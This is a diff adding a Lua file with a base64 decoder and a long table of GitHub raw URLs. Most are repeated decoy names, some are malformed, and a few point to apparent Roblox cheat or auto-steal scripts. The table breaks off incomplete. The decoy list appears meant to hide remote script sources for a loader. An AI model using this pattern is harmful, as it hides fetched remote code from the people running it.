@@ -1,0 +1,525 @@
+local function base64Decode(data)
+    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+local dummyLinks = {
+    "https://raw.githubusercontent.com/xyz789qwerty/ProjectAlpha/refs/heads/main/core_module.lua",
+    "https://raw.githubusercontent.com/abc123def456/SpaceEngine/refs/heads/dev/blackhole_simulator.txt",
+    "https://raw.githubusercontent.com/qwop1029zxcv/UniverseSim/refs/heads/master/quantum_physics.lua",
+    "https://raw.githubusercontent.com/asdf9876ghjk/CosmicCore/refs/heads/beta/dark_matter_engine.txt",
+        "https://raw.githubusercontent.com/BS58dL/BS-/refs/heads/main/Center%20of%20the%20black%20hole",
+    "https://raw.githubusercontent.com/MynameIsDoit/StealAFishAuto/refs/heads/main/AutoSteal.luau",
+    "https://raw.githubusercontent.com/qwop1029zxcv/UniverseSim/refs/heads/master/quantum_physics.lua",
+    "https://raw.githubusercontent.com/asdf9876ghjk/CosmicCore/refs/heads/beta/dark_matter_engine.txt",
+    "https://raw.githubusercontent.com/zmxncbv1234/GalaxyTool/refs/heads/main/star_generator.lua",
+    "https://raw.githubusercontent.com/0987poiuytre/QuantumX/refs/heads/alpha/particle_system.txt",
+    "https://raw.githubusercontent.com/lkjhgfdsa5678/NebulaLib/refs/heads/dev/space_rendering.lua",
+    "https://raw.githubusercontent.com/1357924680qwe/AstroEngine/refs/heads/master/cosmic_rays.txt",
+    "https://raw.githubusercontent.com/qazwsxedcrfv123/BlackHoleX/refs/heads/main/singularity_core.lua",
+    "https://raw.githubusercontent.com/2468013579mko/GravitySim/refs/heads/beta/relativity_module.txt",
+    "https://raw.githubusercontent.com/plmoknijbuv/StellarForge/refs/heads/main/star_formation.lua",
+    "https://raw.githubusercontent.com/cde4567vbnm/EventHorizon/refs/heads/dev/blackhole_physics.txt",
+    "https://raw.githubusercontent.com/zaq1xsw2cde3/CosmicWeb/refs/heads/master/galaxy_cluster.lua",
+    "https://raw.githubusercontent.com/JsYb666/Item/refs/heads/main/99-Nights-TX-XIAN-MIAN______-_-_--_-_-_-_--_-_-_-_--_-_-_-_-_--_-_-_-__------_-_-_-_.lua",
+    "https://raw.githubusercontent.com/ujm89ikolp/TimeDilation/refs/heads/main/relativistic_effects.lua",
+    "https://raw.githubusercontent.com/hgfd5678jklm/DarkMatter/refs/heads/dev/invisible_mass.txt",
+    "https://raw.githubusercontent.com/wqas789edcx/SupernovaX/refs/heads/master/star_explosion.lua",
+    "https://raw.githubusercontent.com/zse45rdxcvf/QuantumEnt/refs/heads/beta/entanglement_module.txt",
+    "https://raw.githubusercontent.com/ijn8765uhbv/CosmicMicrowave/refs/heads/main/cmb_radiation.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticCore/refs/heads/dev/milkyway_sim.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/Interstellar/refs/heads/master/warp_drive.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/NeutronStar/refs/heads/beta/pulsar_physics.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/ExoPlanet/refs/heads/main/alien_worlds.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/CosmicString/refs/heads/dev/space_time.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/QuantumTunnel/refs/heads/master/wormhole_gen.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/UniversalExpansion/refs/heads/beta/bigbang_sim.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/AstroPhysics/refs/heads/main/gravity_wells.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/CelestialNav/refs/heads/dev/star_mapping.txt",
+    "https://raw.githubusercontent.com/098poi76yht/QuantumField/refs/heads/master/particle_gen.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/DarkEnergy/refs/heads/beta/universe_accel.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/SpaceTime/refs/heads/main/fabric_engine.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/GalacticMap/refs/heads/dev/3d_universe.txt",
+    "https://raw.githubusercontent.com/TheHunterSolo1/Scripts/refs/heads/main/Protected_2809220311826785.lua.txt",
+    "https://raw.githubusercontent.com/vfr56tgb78y/StellarWind/refs/heads/beta/solar_flares.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/CosmicRay/refs/heads/main/high_energy.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GravityWell/refs/heads/dev/singularity.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/PlanetGen/refs/heads/master/terrain_engine.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumLock/refs/heads/beta/superposition.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/AstroDroid/refs/heads/main/space_robot.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/GalaxyQuest/refs/heads/dev/star_trek.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/BlackHoleAdventure/refs/heads/master/event_horizon.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/CosmicOdyssey/refs/heads/beta/space_journey.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/IntergalacticWar/refs/heads/main/alien_battle.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/StarDefender/refs/heads/dev/space_defense.txt",
+    "https://raw.githubusercontent.com/098poi76yht/QuantumRebellion/refs/heads/master/time_paradox.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticEmpire/refs/heads/beta/star_wars.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/SpacePirates/refs/heads/main/cosmic_raiders.lua",
+    "https://raw.githubusercontent.com/minisc666/suci/refs/heads/main/suci.lua",
+    "https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua",
+    "tps://raw.githubusercontent.com/JsYb666/TX-Free-YYDS/refs/heads/main/TX-Pro-Free",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumHeist/refs/heads/main/time_robbery.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticZoo/refs/heads/dev/alien_creatures.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/SpaceAcademy/refs/heads/master/astronaut_train.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumAcademy/refs/heads/beta/superhero.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicHospital/refs/heads/main/alien_doctor.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/SpaceRestaurant/refs/heads/dev/cosmic_food.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/InterstellarHotel/refs/heads/master/space_vacation.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticMall/refs/heads/beta/alien_shopping.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumCasino/refs/heads/main/cosmic_gambling.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/SpaceOlympics/refs/heads/dev/zero_g_sports.txt",
+    "https://raw.githubusercontent.com/098poi76yht/CosmicConcert/refs/heads/master/alien_music.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticTheater/refs/heads/beta/space_drama.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/QuantumArtGallery/refs/heads/main/dimensional_art.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/SpaceLibrary/refs/heads/dev/cosmic_books.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/BlackHoleCinema/refs/heads/master/time_movies.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/CosmicMuseum/refs/heads/beta/alien_artifacts.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumZoo/refs/heads/main/paradox_animals.lua",
+    "tps://raw.githubusercontent.com/MIAN57/-/refs/heads/main/%E9%BB%84%E8%84%9A%E6%9C%AC",
+    "https://raw.githubusercontent.com/yhn67ujmki/GalacticPark/refs/heads/master/cosmic_rides.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumFair/refs/heads/beta/time_attractions.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicCircus/refs/heads/main/space_clowns.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/InterstellarCarnival/refs/heads/dev/alien_games.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/BlackHoleFestival/refs/heads/master/singularity_party.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticParade/refs/heads/beta/space_floats.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumFireworks/refs/heads/main/time_explosions.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/CosmicBalloon/refs/heads/dev/space_balloons.txt",
+    "https://raw.githubusercontent.com/098poi76yht/SpaceKite/refs/heads/master/zero_g_kites.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticBubble/refs/heads/beta/cosmic_bubbles.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/QuantumPinata/refs/heads/main/time_candy.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/CosmicPuzzle/refs/heads/dev/space_riddles.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/BlackHoleGame/refs/heads/master/singularity_puzzle.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/InterstellarChess/refs/heads/beta/alien_chess.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumCards/refs/heads/main/time_deck.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticDice/refs/heads/dev/cosmic_dice.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/SpaceDomino/refs/heads/master/zero_g_tiles.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumJigsaw/refs/heads/beta/time_puzzle.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicRubik/refs/heads/main/space_cube.lua",
+    "https://raw.githubusercontent.com/wefwef127382/inkgames.github.io/refs/heads/main/ringta.lua",
+    "https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/githubusercontent.txt",
+    "https://raw.githubusercontent.com/xiaohan666666666/sucinb/fc2884ba7afc3b57cfc0185cc647c1ea60452ede/suci8%E8%84%9A%E6%9C%AC.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticWordSearch/refs/heads/beta/space_words.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumScrabble/refs/heads/main/time_letters.lua",
+    "https://raw.githubusercontent.com/zmxncbv1234/GalaxyTool/refs/heads/main/star_generator.lua",
+    "https://raw.githubusercontent.com/0987poiuytre/QuantumX/refs/heads/alpha/particle_system.txt",
+    "https://raw.githubusercontent.com/lkjhgfdsa5678/NebulaLib/refs/heads/dev/space_rendering.lua",
+    "https://raw.githubusercontent.com/1357924680qwe/AstroEngine/refs/heads/master/cosmic_rays.txt",
+    "https://raw.githubusercontent.com/qazwsxedcrfv123/BlackHoleX/refs/heads/main/singularity_core.lua",
+    "https://raw.githubusercontent.com/2468013579mko/GravitySim/refs/heads/beta/relativity_module.txt",
+    "https://raw.githubusercontent.com/plmoknijbuv/StellarForge/refs/heads/main/star_formation.lua",
+    "https://raw.githubusercontent.com/cde4567vbnm/EventHorizon/refs/heads/dev/blackhole_physics.txt",
+    "https://raw.githubusercontent.com/zaq1xsw2cde3/CosmicWeb/refs/heads/master/galaxy_cluster.lua",
+    "https://raw.githubusercontent.com/rfv456yhnm/QuantumFoam/refs/heads/beta/virtual_particles.txt",
+    "https://raw.githubusercontent.com/ujm89ikolp/TimeDilation/refs/heads/main/relativistic_effects.lua",
+    "https://raw.githubusercontent.com/hgfd5678jklm/DarkMatter/refs/heads/dev/invisible_mass.txt",
+    "https://raw.githubusercontent.com/wqas789edcx/SupernovaX/refs/heads/master/star_explosion.lua",
+    "https://raw.githubusercontent.com/zse45rdxcvf/QuantumEnt/refs/heads/beta/entanglement_module.txt",
+    "https://raw.githubusercontent.com/ijn8765uhbv/CosmicMicrowave/refs/heads/main/cmb_radiation.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticCore/refs/heads/dev/milkyway_sim.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/Interstellar/refs/heads/master/warp_drive.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/NeutronStar/refs/heads/beta/pulsar_physics.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/ExoPlanet/refs/heads/main/alien_worlds.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/CosmicString/refs/heads/dev/space_time.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/QuantumTunnel/refs/heads/master/wormhole_gen.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/UniversalExpansion/refs/heads/beta/bigbang_sim.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/AstroPhysics/refs/heads/main/gravity_wells.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/CelestialNav/refs/heads/dev/star_mapping.txt",
+    "https://raw.githubusercontent.com/098poi76yht/QuantumField/refs/heads/master/particle_gen.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/DarkEnergy/refs/heads/beta/universe_accel.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/SpaceTime/refs/heads/main/fabric_engine.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/GalacticMap/refs/heads/dev/3d_universe.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/QuantumLeap/refs/heads/master/time_travel.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/StellarWind/refs/heads/beta/solar_flares.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/CosmicRay/refs/heads/main/high_energy.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GravityWell/refs/heads/dev/singularity.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/PlanetGen/refs/heads/master/terrain_engine.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumLock/refs/heads/beta/superposition.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/AstroDroid/refs/heads/main/space_robot.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/GalaxyQuest/refs/heads/dev/star_trek.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/BlackHoleAdventure/refs/heads/master/event_horizon.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/CosmicOdyssey/refs/heads/beta/space_journey.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/IntergalacticWar/refs/heads/main/alien_battle.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/StarDefender/refs/heads/dev/space_defense.txt",
+    "https://raw.githubusercontent.com/098poi76yht/QuantumRebellion/refs/heads/master/time_paradox.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticEmpire/refs/heads/beta/star_wars.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/SpacePirates/refs/heads/main/cosmic_raiders.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/AstroExplorer/refs/heads/dev/planet_hopping.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/BlackHoleMystery/refs/heads/master/singularity_puzzle.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/CosmicDetective/refs/heads/beta/space_crime.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumHeist/refs/heads/main/time_robbery.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticZoo/refs/heads/dev/alien_creatures.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/SpaceAcademy/refs/heads/master/astronaut_train.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumAcademy/refs/heads/beta/superhero.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicHospital/refs/heads/main/alien_doctor.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/SpaceRestaurant/refs/heads/dev/cosmic_food.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/InterstellarHotel/refs/heads/master/space_vacation.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticMall/refs/heads/beta/alien_shopping.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumCasino/refs/heads/main/cosmic_gambling.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/SpaceOlympics/refs/heads/dev/zero_g_sports.txt",
+    "https://raw.githubusercontent.com/098poi76yht/CosmicConcert/refs/heads/master/alien_music.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticTheater/refs/heads/beta/space_drama.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/QuantumArtGallery/refs/heads/main/dimensional_art.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/SpaceLibrary/refs/heads/dev/cosmic_books.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/BlackHoleCinema/refs/heads/master/time_movies.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/CosmicMuseum/refs/heads/beta/alien_artifacts.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumZoo/refs/heads/main/paradox_animals.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/SpaceAquarium/refs/heads/dev/alien_fish.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/GalacticPark/refs/heads/master/cosmic_rides.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumFair/refs/heads/beta/time_attractions.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicCircus/refs/heads/main/space_clowns.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/InterstellarCarnival/refs/heads/dev/alien_games.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/BlackHoleFestival/refs/heads/master/singularity_party.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticParade/refs/heads/beta/space_floats.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumFireworks/refs/heads/main/time_explosions.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/CosmicBalloon/refs/heads/dev/space_balloons.txt",
+    "https://raw.githubusercontent.com/098poi76yht/SpaceKite/refs/heads/master/zero_g_kites.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticBubble/refs/heads/beta/cosmic_bubbles.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/QuantumPinata/refs/heads/main/time_candy.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/CosmicPuzzle/refs/heads/dev/space_riddles.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/BlackHoleGame/refs/heads/master/singularity_puzzle.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/InterstellarChess/refs/heads/beta/alien_chess.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumCards/refs/heads/main/time_deck.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticDice/refs/heads/dev/cosmic_dice.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/SpaceDomino/refs/heads/master/zero_g_tiles.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumJigsaw/refs/heads/beta/time_puzzle.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicRubik/refs/heads/main/space_cube.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/InterstellarSudoku/refs/heads/dev/alien_numbers.txt",
+    "https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/githubusercontent.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/BlackHoleCrossword/refs/heads/master/singularity_words.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticWordSearch/refs/heads/beta/space_words.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumScrabble/refs/heads/main/time_letters.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/CosmicBingo/refs/heads/dev/alien_numbers.txt",
+    "https://raw.githubusercontent.com/098poi76yht/SpacePoker/refs/heads/master/zero_g_cards.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticRoulette/refs/heads/beta/cosmic_wheel.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/QuantumSlot/refs/heads/main/time_machine.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/CosmicLottery/refs/heads/dev/space_tickets.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/BlackHoleJackpot/refs/heads/master/singularity_win.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/InterstellarBingo/refs/heads/beta/alien_numbers.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumRaffle/refs/heads/main/time_tickets.lua",
+        "https://raw.githubusercontent.com/BS58dL/BS-/refs/heads/main/Center%20of%20the%20black%20hole",
+    "https://raw.githubusercontent.com/MynameIsDoit/StealAFishAuto/refs/heads/main/AutoSteal.luau",
+    "https://raw.githubusercontent.com/qwop1029zxcv/UniverseSim/refs/heads/master/quantum_physics.lua",
+    "https://raw.githubusercontent.com/asdf9876ghjk/CosmicCore/refs/heads/beta/dark_matter_engine.txt",
+    "https://raw.githubusercontent.com/zmxncbv1234/GalaxyTool/refs/heads/main/star_generator.lua",
+    "https://raw.githubusercontent.com/0987poiuytre/QuantumX/refs/heads/alpha/particle_system.txt",
+    "https://raw.githubusercontent.com/lkjhgfdsa5678/NebulaLib/refs/heads/dev/space_rendering.lua",
+    "https://raw.githubusercontent.com/1357924680qwe/AstroEngine/refs/heads/master/cosmic_rays.txt",
+    "https://raw.githubusercontent.com/qazwsxedcrfv123/BlackHoleX/refs/heads/main/singularity_core.lua",
+    "https://raw.githubusercontent.com/2468013579mko/GravitySim/refs/heads/beta/relativity_module.txt",
+    "https://raw.githubusercontent.com/plmoknijbuv/StellarForge/refs/heads/main/star_formation.lua",
+    "https://raw.githubusercontent.com/cde4567vbnm/EventHorizon/refs/heads/dev/blackhole_physics.txt",
+    "https://raw.githubusercontent.com/zaq1xsw2cde3/CosmicWeb/refs/heads/master/galaxy_cluster.lua",
+    "https://raw.githubusercontent.com/JsYb666/Item/refs/heads/main/99-Nights-TX-XIAN-MIAN______-_-_--_-_-_-_--_-_-_-_--_-_-_-_-_--_-_-_-__------_-_-_-_.lua",
+    "https://raw.githubusercontent.com/ujm89ikolp/TimeDilation/refs/heads/main/relativistic_effects.lua",
+    "https://raw.githubusercontent.com/hgfd5678jklm/DarkMatter/refs/heads/dev/invisible_mass.txt",
+    "https://raw.githubusercontent.com/wqas789edcx/SupernovaX/refs/heads/master/star_explosion.lua",
+    "https://raw.githubusercontent.com/zse45rdxcvf/QuantumEnt/refs/heads/beta/entanglement_module.txt",
+    "https://raw.githubusercontent.com/ijn8765uhbv/CosmicMicrowave/refs/heads/main/cmb_radiation.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticCore/refs/heads/dev/milkyway_sim.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/Interstellar/refs/heads/master/warp_drive.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/NeutronStar/refs/heads/beta/pulsar_physics.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/ExoPlanet/refs/heads/main/alien_worlds.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/CosmicString/refs/heads/dev/space_time.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/QuantumTunnel/refs/heads/master/wormhole_gen.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/UniversalExpansion/refs/heads/beta/bigbang_sim.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/AstroPhysics/refs/heads/main/gravity_wells.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/CelestialNav/refs/heads/dev/star_mapping.txt",
+    "https://raw.githubusercontent.com/098poi76yht/QuantumField/refs/heads/master/particle_gen.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/DarkEnergy/refs/heads/beta/universe_accel.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/SpaceTime/refs/heads/main/fabric_engine.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/GalacticMap/refs/heads/dev/3d_universe.txt",
+    "https://raw.githubusercontent.com/TheHunterSolo1/Scripts/refs/heads/main/Protected_2809220311826785.lua.txt",
+    "https://raw.githubusercontent.com/vfr56tgb78y/StellarWind/refs/heads/beta/solar_flares.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/CosmicRay/refs/heads/main/high_energy.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GravityWell/refs/heads/dev/singularity.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/PlanetGen/refs/heads/master/terrain_engine.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumLock/refs/heads/beta/superposition.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/AstroDroid/refs/heads/main/space_robot.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/GalaxyQuest/refs/heads/dev/star_trek.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/BlackHoleAdventure/refs/heads/master/event_horizon.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/CosmicOdyssey/refs/heads/beta/space_journey.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/IntergalacticWar/refs/heads/main/alien_battle.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/StarDefender/refs/heads/dev/space_defense.txt",
+    "https://raw.githubusercontent.com/098poi76yht/QuantumRebellion/refs/heads/master/time_paradox.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticEmpire/refs/heads/beta/star_wars.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/SpacePirates/refs/heads/main/cosmic_raiders.lua",
+    "https://raw.githubusercontent.com/minisc666/suci/refs/heads/main/suci.lua",
+    "https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua",
+    "tps://raw.githubusercontent.com/JsYb666/TX-Free-YYDS/refs/heads/main/TX-Pro-Free",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumHeist/refs/heads/main/time_robbery.lua",
+    "https://raw.githubusercontent.com/mko09ijnbhu/GalacticZoo/refs/heads/dev/alien_creatures.txt",
+    "https://raw.githubusercontent.com/yhn67ujmki/SpaceAcademy/refs/heads/master/astronaut_train.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumAcademy/refs/heads/beta/superhero.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicHospital/refs/heads/main/alien_doctor.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/SpaceRestaurant/refs/heads/dev/cosmic_food.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/InterstellarHotel/refs/heads/master/space_vacation.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticMall/refs/heads/beta/alien_shopping.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumCasino/refs/heads/main/cosmic_gambling.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/SpaceOlympics/refs/heads/dev/zero_g_sports.txt",
+    "https://raw.githubusercontent.com/098poi76yht/CosmicConcert/refs/heads/master/alien_music.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticTheater/refs/heads/beta/space_drama.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/QuantumArtGallery/refs/heads/main/dimensional_art.lua",
+    "https://raw.githubusercontent.com/poi98uy76tr/SpaceLibrary/refs/heads/dev/cosmic_books.txt",
+    "https://raw.githubusercontent.com/zaq12xsw34cd/BlackHoleCinema/refs/heads/master/time_movies.lua",
+    "https://raw.githubusercontent.com/vfr56tgb78y/CosmicMuseum/refs/heads/beta/alien_artifacts.txt",
+    "https://raw.githubusercontent.com/nji87uhb65v/QuantumZoo/refs/heads/main/paradox_animals.lua",
+    "tps://raw.githubusercontent.com/MIAN57/-/refs/heads/main/%E9%BB%84%E8%84%9A%E6%9C%AC",
+    "https://raw.githubusercontent.com/yhn67ujmki/GalacticPark/refs/heads/master/cosmic_rides.lua",
+    "https://raw.githubusercontent.com/tgb89ijnhy/QuantumFair/refs/heads/beta/time_attractions.txt",
+    "https://raw.githubusercontent.com/rfv45tgbyhn/CosmicCircus/refs/heads/main/space_clowns.lua",
+    "https://raw.githubusercontent.com/edc34rfv56/InterstellarCarnival/refs/heads/dev/alien_games.txt",
+    "https://raw.githubusercontent.com/wsz12xcd34/BlackHoleFestival/refs/heads/master/singularity_party.lua",
+    "https://raw.githubusercontent.com/qaz23wsx45/GalacticParade/refs/heads/beta/space_floats.txt",
+    "https://raw.githubusercontent.com/6789ijnhyg/QuantumFireworks/refs/heads/main/time_explosions.lua",
+    "https://raw.githubusercontent.com/vfr43edcxza/CosmicBalloon/refs/heads/dev/space_balloons.txt",
+    "https://raw.githubusercontent.com/098poi76yht/SpaceKite/refs/heads/master/zero_g_kites.lua",
+    "https://raw.githubusercontent.com/mnb67vcxz89/GalacticBubble/refs/heads/beta/cosmic_bubbles.txt",
+    "https://raw.githubusercontent.com/lkj78hgf45d/QuantumPinata/refs/heads/main/time_candy.lua",
